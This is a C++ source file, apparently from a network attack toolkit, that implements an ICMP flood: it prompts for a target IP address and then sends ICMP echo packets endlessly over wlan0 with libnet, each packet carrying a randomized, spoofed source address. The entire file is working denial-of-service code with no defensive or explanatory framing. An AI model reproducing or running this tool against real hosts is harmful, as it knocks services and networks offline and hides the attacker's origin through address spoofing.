#include <arpa/inet.h>
#include <cstdlib>
#include <iostream>
#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <pcap.h>
#include <pcap/pcap.h>

#include "../../include/full_include.hpp"

int icmp_flood() {
  std::string ip;

  std::cout << "  inputip: ";
  std::cin >> ip;

  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *l = libnet_init(LIBNET_RAW4, "wlan0", errbuf);
  if (l == nullptr) {
    std::cerr << "[!!] libnet_init: " << errbuf << std::endl;
    return 1;
  }

  uint32_t dst_ip = libnet_name2addr4(l, ip.c_str(), LIBNET_RESOLVE);
  if (dst_ip == (uint32_t)-1) {
    std::cerr << "[!!] Invalid IP address: " << ip << std::endl;
    libnet_destroy(l);
    return 1;
  }

  std::cout << "  \033[38;5;196mICMP-flood:\t" << print_ip(&dst_ip) << "..."
            << "\033[0m" << std::endl;

  uint8_t payload[56] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnop";

  while (true) {
    libnet_clear_packet(l);

    libnet_ptag_t icmp_tag = libnet_build_icmpv4_echo(
        ICMP_ECHO, 0, 0, libnet_get_prand(LIBNET_PRu16),
        libnet_get_prand(LIBNET_PRu16), payload, sizeof(payload), l, 0);

    if (icmp_tag == (libnet_ptag_t)-1) {
      std::cerr << "Error building ICMP: " << libnet_geterror(l) << std::endl;
      continue;
    }

    libnet_ptag_t ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H, IPTOS_LOWDELAY,
        libnet_get_prand(LIBNET_PRu16), 0, libnet_get_prand(LIBNET_PR8),
        IPPROTO_ICMP, 0, libnet_get_prand(LIBNET_PRu32), dst_ip, nullptr, 0, l,
        0);

    if (ip_tag == (libnet_ptag_t)-1) {
      std::cerr << "Error building IP: " << libnet_geterror(l) << std::endl;
      continue;
    }

    libnet_write(l);
  }

  libnet_destroy(l);

  return 0;
}
